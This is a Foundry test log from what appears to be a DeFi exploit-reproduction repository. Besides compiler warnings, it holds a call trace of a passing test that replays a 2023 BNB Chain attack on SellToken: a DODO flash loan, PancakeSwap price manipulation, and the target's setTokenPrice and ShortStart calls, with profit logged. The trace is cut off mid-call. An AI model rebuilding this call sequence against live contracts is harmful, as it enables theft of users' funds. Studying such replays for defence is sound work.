Compiling 28 files with Solc 0.8.25
Solc 0.8.25 finished in 1.32s
Compiler run successful with warnings:
Warning (2519): This declaration shadows an existing declaration.
   --> src/test/interface.sol:886:5:
    |
886 |     function WETH() external view returns (address);
    |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:1598:5:
     |
1598 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:1850:5:
     |
1850 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:2560:5:
     |
2560 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:3759:5:
     |
3759 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).


Ran 1 test for script/Exploit-template_new.sol:ExploitScript
[PASS] testExploit() (gas: 20485)
Logs:
  Attacker ETH Balance Before exploit: 0.000000000000000000
  Attacker ETH Balance After exploit: 0.000000000000000000

Traces:
  [20485] ExploitScript::testExploit()
    в”њв”Ђ [0] VM::deal(ExploitScript: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0)
    в”‚   в””в”Ђ в†ђ [Return] 
    в”њв”Ђ emit log_named_decimal_uint(key: "Attacker ETH Balance Before exploit", val: 0, decimals: 18)
    в”њв”Ђ emit log_named_decimal_uint(key: "Attacker ETH Balance After exploit", val: 0, decimals: 18)
    в””в”Ђ в†ђ [Stop] 

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 271.24ms (183.40Вµs CPU time)

Ran 1 test for src/test/2023-05/SellToken_exp.sol:SellTokenExp
[PASS] testExp() (gas: 752810)
Logs:
  WBNB cost first: 1.044094989776594473
  WBNB total profit: 3.112948098078880127

Traces:
  [946278] SellTokenExp::testExp()
    в”њв”Ђ [2534] 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c::balanceOf(0xFeAFe253802b77456B4627F8c2306a9CeBb5d681) [staticcall]
    в”‚   в””в”Ђ в†ђ [Return] 418509475390597934136 [4.185e20]
    в”њв”Ђ [319476] 0xFeAFe253802b77456B4627F8c2306a9CeBb5d681::flashLoan(418509475390597934136 [4.185e20], 0, SellTokenExp: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x61313233343536373839303132333435363738393031323334353637383930)
    в”‚   в”њв”Ђ [10862] 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c::transfer(SellTokenExp: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 418509475390597934136 [4.185e20])
    в”‚   в”‚   в”њв”Ђ emit Transfer(from: 0xFeAFe253802b77456B4627F8c2306a9CeBb5d681, to: SellTokenExp: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 418509475390597934136 [4.185e20])
    в”‚   в”‚   в””в”Ђ в†ђ [Return] true
    в”‚   в”њв”Ђ [282271] SellTokenExp::DPPFlashLoanCall(SellTokenExp: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 418509475390597934136 [4.185e20], 0, 0x61313233343536373839303132333435363738393031323334353637383930)
    в”‚   в”‚   в”њв”Ђ [534] 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c::balanceOf(SellTokenExp: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 428509475390597934136 [4.285e20]
    в”‚   в”‚   в”њв”Ђ [9195] 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c::withdraw(4185094753905979342 [4.185e18])
    в”‚   в”‚   в”‚   в”њв”Ђ [55] SellTokenExp::receive{value: 4185094753905979342}()
    в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Stop] 
    в”‚   в”‚   в”‚   в”њв”Ђ emit Withdrawal(src: SellTokenExp: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], wad: 4185094753905979342 [4.185e18])
    в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Stop] 
    в”‚   в”‚   в”њв”Ђ [24420] 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c::approve(0x10ED43C718714eb63d5aA57B78B54704E256024E, 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
    в”‚   в”‚   в”‚   в”њв”Ђ emit Approval(owner: SellTokenExp: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: 0x10ED43C718714eb63d5aA57B78B54704E256024E, value: 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
    в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] true
    в”‚   в”‚   в”њв”Ђ [24620] 0xa645995e9801F2ca6e2361eDF4c2A138362BADe4::approve(0x10ED43C718714eb63d5aA57B78B54704E256024E, 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
    в”‚   в”‚   в”‚   в”њв”Ђ emit Approval(owner: SellTokenExp: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: 0x10ED43C718714eb63d5aA57B78B54704E256024E, value: 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
    в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] true
    в”‚   в”‚   в”њв”Ђ [86454] 0x10ED43C718714eb63d5aA57B78B54704E256024E::swapExactTokensForTokens(414324380636691954794 [4.143e20], 0, [0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c, 0xa645995e9801F2ca6e2361eDF4c2A138362BADe4], SellTokenExp: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1683962933 [1.683e9])
    в”‚   в”‚   в”‚   в”њв”Ђ [2893] 0x358EfC593134f99833C66894cCeCD41F550051b6::getReserves() [staticcall]
    в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 10131261910696925365107624 [1.013e25], 419961013712194393900 [4.199e20], 1683961924 [1.683e9]
    в”‚   в”‚   в”‚   в”њв”Ђ [8225] 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c::transferFrom(SellTokenExp: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x358EfC593134f99833C66894cCeCD41F550051b6, 414324380636691954794 [4.143e20])
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ emit Transfer(from: SellTokenExp: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x358EfC593134f99833C66894cCeCD41F550051b6, value: 414324380636691954794 [4.143e20])
    в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] true
    в”‚   в”‚   в”‚   в”њв”Ђ [64367] 0x358EfC593134f99833C66894cCeCD41F550051b6::swap(5025066711831328845319833 [5.025e24], 0, SellTokenExp: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x)
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [29959] 0xa645995e9801F2ca6e2361eDF4c2A138362BADe4::transfer(SellTokenExp: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 5025066711831328845319833 [5.025e24])
    в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ emit Transfer(from: 0x358EfC593134f99833C66894cCeCD41F550051b6, to: SellTokenExp: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 5025066711831328845319833 [5.025e24])
    в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] true
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [562] 0xa645995e9801F2ca6e2361eDF4c2A138362BADe4::balanceOf(0x358EfC593134f99833C66894cCeCD41F550051b6) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 5106195198865596519787791 [5.106e24]
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [534] 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c::balanceOf(0x358EfC593134f99833C66894cCeCD41F550051b6) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 834285394348886348694 [8.342e20]
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ emit Sync(reserve0: 5106195198865596519787791 [5.106e24], reserve1: 834285394348886348694 [8.342e20])
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ emit Swap(sender: 0x10ED43C718714eb63d5aA57B78B54704E256024E, amount0In: 0, amount1In: 414324380636691954794 [4.143e20], amount0Out: 5025066711831328845319833 [5.025e24], amount1Out: 0, to: SellTokenExp: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
    в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Stop] 
    в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] [414324380636691954794 [4.143e20], 5025066711831328845319833 [5.025e24]]
    в”‚   в”‚   в”њв”Ђ [64153] 0x57Db19127617B77c8abd9420b5a35502b59870D6::setTokenPrice(0xa645995e9801F2ca6e2361eDF4c2A138362BADe4)
    в”‚   в”‚   в”‚   в”њв”Ђ [2602] 0x8D190C70937493046a464440d28f126A4E42eF7f::getPair(0xa645995e9801F2ca6e2361eDF4c2A138362BADe4) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 0x000000000000000000000000bb4cdb9cbd36b01bd1cbaebf2de08d9173bc095c
    в”‚   в”‚   в”‚   в”њв”Ђ [5111] 0x10ED43C718714eb63d5aA57B78B54704E256024E::getAmountsOut(1000000000000000000 [1e18], [0xa645995e9801F2ca6e2361eDF4c2A138362BADe4, 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c]) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [893] 0x358EfC593134f99833C66894cCeCD41F550051b6::getReserves() [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 5106195198865596519787791 [5.106e24], 834285394348886348694 [8.342e20], 1683961933 [1.683e9]
    в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] [1000000000000000000 [1e18], 162978398960726 [1.629e14]]
    в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Stop] 
    в”‚   в”‚   в”њв”Ђ [562] 0xa645995e9801F2ca6e2361eDF4c2A138362BADe4::balanceOf(SellTokenExp: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 5025066711831328845319833 [5.025e24]
    в”‚   в”‚   в”њв”Ђ [34478] 0x10ED43C718714eb63d5aA57B78B54704E256024E::swapExactTokensForTokensSupportingFeeOnTransferTokens(5025066711831328845319833 [5.025e24], 0, [0xa645995e9801F2ca6e2361eDF4c2A138362BADe4, 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c], SellTokenExp: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1683962933 [1.683e9])
    в”‚   в”‚   в”‚   в”њв”Ђ [3627] 0xa645995e9801F2ca6e2361eDF4c2A138362BADe4::transferFrom(SellTokenExp: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x358EfC593134f99833C66894cCeCD41F550051b6, 5025066711831328845319833 [5.025e24])
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ emit Transfer(from: SellTokenExp: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x358EfC593134f99833C66894cCeCD41F550051b6, value: 5025066711831328845319833 [5.025e24])
    в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] true
    в”‚   в”‚   в”‚   в”њв”Ђ [534] 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c::balanceOf(SellTokenExp: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 10000000000000000000 [1e19]
    в”‚   в”‚   в”‚   в”њв”Ђ [893] 0x358EfC593134f99833C66894cCeCD41F550051b6::getReserves() [staticcall]
    в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 5106195198865596519787791 [5.106e24], 834285394348886348694 [8.342e20], 1683961933 [1.683e9]
    в”‚   в”‚   в”‚   в”њв”Ђ [562] 0xa645995e9801F2ca6e2361eDF4c2A138362BADe4::balanceOf(0x358EfC593134f99833C66894cCeCD41F550051b6) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 10131261910696925365107624 [1.013e25]
    в”‚   в”‚   в”‚   в”њв”Ђ [21186] 0x358EfC593134f99833C66894cCeCD41F550051b6::swap(0, 413280285646915360321 [4.132e20], SellTokenExp: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x)
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [6062] 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c::transfer(SellTokenExp: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 413280285646915360321 [4.132e20])
    в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ emit Transfer(from: 0x358EfC593134f99833C66894cCeCD41F550051b6, to: SellTokenExp: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 413280285646915360321 [4.132e20])
    в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] true
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [562] 0xa645995e9801F2ca6e2361eDF4c2A138362BADe4::balanceOf(0x358EfC593134f99833C66894cCeCD41F550051b6) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 10131261910696925365107624 [1.013e25]
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [534] 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c::balanceOf(0x358EfC593134f99833C66894cCeCD41F550051b6) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 421005108701970988373 [4.21e20]
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ emit Sync(reserve0: 10131261910696925365107624 [1.013e25], reserve1: 421005108701970988373 [4.21e20])
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ emit Swap(sender: 0x10ED43C718714eb63d5aA57B78B54704E256024E, amount0In: 5025066711831328845319833 [5.025e24], amount1In: 0, amount0Out: 0, amount1Out: 413280285646915360321 [4.132e20], to: SellTokenExp: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
    в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Stop] 
    в”‚   в”‚   в”‚   в”њв”Ђ [534] 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c::balanceOf(SellTokenExp: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 423280285646915360321 [4.232e20]
    в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Stop] 
    в”‚   в”‚   в”њв”Ђ [2074] 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c::deposit{value: 4185094753905979342}()
    в”‚   в”‚   в”‚   в”њв”Ђ emit Deposit(dst: SellTokenExp: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], wad: 4185094753905979342 [4.185e18])
    в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Stop] 
    в”‚   в”‚   в”њв”Ђ [3262] 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c::transfer(0xFeAFe253802b77456B4627F8c2306a9CeBb5d681, 418509475390597934136 [4.185e20])
    в”‚   в”‚   в”‚   в”њв”Ђ emit Transfer(from: SellTokenExp: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0xFeAFe253802b77456B4627F8c2306a9CeBb5d681, value: 418509475390597934136 [4.185e20])
    в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] true
    в”‚   в”‚   в”њв”Ђ [534] 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c::balanceOf(SellTokenExp: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 8955905010223405527 [8.955e18]
    в”‚   в”‚   в”њв”Ђ emit log_named_decimal_uint(key: "WBNB cost first", val: 1044094989776594473 [1.044e18], decimals: 18)
    в”‚   в”‚   в””в”Ђ в†ђ [Stop] 
    в”‚   в”њв”Ђ [534] 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c::balanceOf(0xFeAFe253802b77456B4627F8c2306a9CeBb5d681) [staticcall]
    в”‚   в”‚   в””в”Ђ в†ђ [Return] 418509475390597934136 [4.185e20]
    в”‚   в”њв”Ђ [2531] 0x55d398326f99059fF775485246999027B3197955::balanceOf(0xFeAFe253802b77456B4627F8c2306a9CeBb5d681) [staticcall]
    в”‚   в”‚   в””в”Ђ в†ђ [Return] 923675098292473509857042 [9.236e23]
    в”‚   в”њв”Ђ [534] 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c::balanceOf(0xFeAFe253802b77456B4627F8c2306a9CeBb5d681) [staticcall]
    в”‚   в”‚   в””в”Ђ в†ђ [Return] 418509475390597934136 [4.185e20]
    в”‚   в”њв”Ђ [531] 0x55d398326f99059fF775485246999027B3197955::balanceOf(0xFeAFe253802b77456B4627F8c2306a9CeBb5d681) [staticcall]
    в”‚   в”‚   в””в”Ђ в†ђ [Return] 923675098292473509857042 [9.236e23]
    в”‚   в”њв”Ђ emit DODOFlashLoan(: SellTokenExp: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], : SellTokenExp: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], : 418509475390597934136 [4.185e20], : 0)
    в”‚   в””в”Ђ в†ђ [Stop] 
    в”њв”Ђ [0] VM::warp(1683962033 [1.683e9])
    в”‚   в””в”Ђ в†ђ [Return] 
    в”њв”Ђ [534] 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c::balanceOf(0xFeAFe253802b77456B4627F8c2306a9CeBb5d681) [staticcall]
    в”‚   в””в”Ђ в†ђ [Return] 418509475390597934136 [4.185e20]
    в”њв”Ђ [605553] 0xFeAFe253802b77456B4627F8c2306a9CeBb5d681::flashLoan(418509475390597934136 [4.185e20], 0, SellTokenExp: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x616263)
    в”‚   в”њв”Ђ [6062] 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c::transfer(SellTokenExp: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 418509475390597934136 [4.185e20])
    в”‚   в”‚   в”њв”Ђ emit Transfer(from: 0xFeAFe253802b77456B4627F8c2306a9CeBb5d681, to: SellTokenExp: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 418509475390597934136 [4.185e20])
    в”‚   в”‚   в””в”Ђ в†ђ [Return] true
    в”‚   в”њв”Ђ [582594] SellTokenExp::DPPFlashLoanCall(SellTokenExp: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 418509475390597934136 [4.185e20], 0, 0x616263)
    в”‚   в”‚   в”њв”Ђ [534] 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c::balanceOf(SellTokenExp: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 427465380400821339663 [4.274e20]
    в”‚   в”‚   в”њв”Ђ [9195] 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c::withdraw(4274653804008213397 [4.274e18])
    в”‚   в”‚   в”‚   в”њв”Ђ [55] SellTokenExp::receive{value: 4274653804008213397}()
    в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Stop] 
    в”‚   в”‚   в”‚   в”њв”Ђ emit Withdrawal(src: SellTokenExp: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], wad: 4274653804008213397 [4.274e18])
    в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Stop] 
    в”‚   в”‚   в”њв”Ђ [2420] 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c::approve(0x10ED43C718714eb63d5aA57B78B54704E256024E, 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
    в”‚   в”‚   в”‚   в”њв”Ђ emit Approval(owner: SellTokenExp: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: 0x10ED43C718714eb63d5aA57B78B54704E256024E, value: 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
    в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] true
    в”‚   в”‚   в”њв”Ђ [2620] 0xa645995e9801F2ca6e2361eDF4c2A138362BADe4::approve(0x10ED43C718714eb63d5aA57B78B54704E256024E, 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
    в”‚   в”‚   в”‚   в”њв”Ђ emit Approval(owner: SellTokenExp: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: 0x10ED43C718714eb63d5aA57B78B54704E256024E, value: 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
    в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] true
    в”‚   в”‚   в”њв”Ђ [54754] 0x10ED43C718714eb63d5aA57B78B54704E256024E::swapExactTokensForTokens(423190726596813126266 [4.231e20], 0, [0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c, 0xa645995e9801F2ca6e2361eDF4c2A138362BADe4], SellTokenExp: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1683963033 [1.683e9])
    в”‚   в”‚   в”‚   в”њв”Ђ [893] 0x358EfC593134f99833C66894cCeCD41F550051b6::getReserves() [staticcall]
    в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 10131261910696925365107624 [1.013e25], 421005108701970988373 [4.21e20], 1683961933 [1.683e9]
    в”‚   в”‚   в”‚   в”њв”Ђ [3425] 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c::transferFrom(SellTokenExp: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x358EfC593134f99833C66894cCeCD41F550051b6, 423190726596813126266 [4.231e20])
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ emit Transfer(from: SellTokenExp: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x358EfC593134f99833C66894cCeCD41F550051b6, value: 423190726596813126266 [4.231e20])
    в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] true
    в”‚   в”‚   в”‚   в”њв”Ђ [41967] 0x358EfC593134f99833C66894cCeCD41F550051b6::swap(5072405901456677064951523 [5.072e24], 0, SellTokenExp: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x)
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [25959] 0xa645995e9801F2ca6e2361eDF4c2A138362BADe4::transfer(SellTokenExp: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 5072405901456677064951523 [5.072e24])
    в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ emit Transfer(from: 0x358EfC593134f99833C66894cCeCD41F550051b6, to: SellTokenExp: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 5072405901456677064951523 [5.072e24])
    в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] true
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [562] 0xa645995e9801F2ca6e2361eDF4c2A138362BADe4::balanceOf(0x358EfC593134f99833C66894cCeCD41F550051b6) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 5058856009240248300156101 [5.058e24]
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [534] 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c::balanceOf(0x358EfC593134f99833C66894cCeCD41F550051b6) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 844195835298784114639 [8.441e20]
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ emit Sync(reserve0: 5058856009240248300156101 [5.058e24], reserve1: 844195835298784114639 [8.441e20])
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ emit Swap(sender: 0x10ED43C718714eb63d5aA57B78B54704E256024E, amount0In: 0, amount1In: 423190726596813126266 [4.231e20], amount0Out: 5072405901456677064951523 [5.072e24], amount1Out: 0, to: SellTokenExp: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
    в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Stop] 
    в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] [423190726596813126266 [4.231e20], 5072405901456677064951523 [5.072e24]]
    в”‚   в”‚   в”њв”Ђ [343941] 0x57Db19127617B77c8abd9420b5a35502b59870D6::ShortStart{value: 4274653804008213397}(0xa645995e9801F2ca6e2361eDF4c2A138362BADe4, SellTokenExp: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1)
    в”‚   в”‚   в”‚   в”њв”Ђ [602] 0x8D190C70937493046a464440d28f126A4E42eF7f::getPair(0xa645995e9801F2ca6e2361eDF4c2A138362BADe4) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 0x000000000000000000000000bb4cdb9cbd36b01bd1cbaebf2de08d9173bc095c
    в”‚   в”‚   в”‚   в”њв”Ђ [5111] 0x10ED43C718714eb63d5aA57B78B54704E256024E::getAmountsOut(1000000000000000000 [1e18], [0xa645995e9801F2ca6e2361eDF4c2A138362BADe4, 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c]) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [893] 0x358EfC593134f99833C66894cCeCD41F550051b6::getReserves() [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 5058856009240248300156101 [5.058e24], 844195835298784114639 [8.441e20], 1683962033 [1.683e9]
    в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] [1000000000000000000 [1e18], 166457629576912 [1.664e14]]
    в”‚   в”‚   в”‚   в”њв”Ђ [2586] 0x8D190C70937493046a464440d28f126A4E42eF7f::balanceOf(0xa645995e9801F2ca6e2361eDF4c2A138362BADe4) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 15917150134720644674378854 [1.591e25]
    в”‚   в”‚   в”‚   в”њв”Ђ [5111] 0x10ED43C718714eb63d5aA57B78B54704E256024E::getAmountsOut(15917150134720644674378854 [1.591e25], [0xa645995e9801F2ca6e2361eDF4c2A138362BADe4, 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c]) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [893] 0x358EfC593134f99833C66894cCeCD41F550051b6::getReserves() [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 5058856009240248300156101 [5.058e24], 844195835298784114639 [8.441e20], 1683962033 [1.683e9]
    в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] [15917150134720644674378854 [1.591e25], 640211231226325259630 [6.402e20]]
    в”‚   в”‚   в”‚   в”њв”Ђ [5151] 0x10ED43C718714eb63d5aA57B78B54704E256024E::getAmountsOut(4189160727928049129 [4.189e18], [0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c, 0xa645995e9801F2ca6e2361eDF4c2A138362BADe4]) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [893] 0x358EfC593134f99833C66894cCeCD41F550051b6::getReserves() [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 5058856009240248300156101 [5.058e24], 844195835298784114639 [8.441e20], 1683962033 [1.683e9]
    в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] [4189160727928049129 [4.189e18], 24917509241062720965794 [2.491e22]]
    в”‚   в”‚   в”‚   в”њв”Ђ [55] 0x8D190C70937493046a464440d28f126A4E42eF7f::fallback{value: 4146414189887966995}()
    в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Stop] 
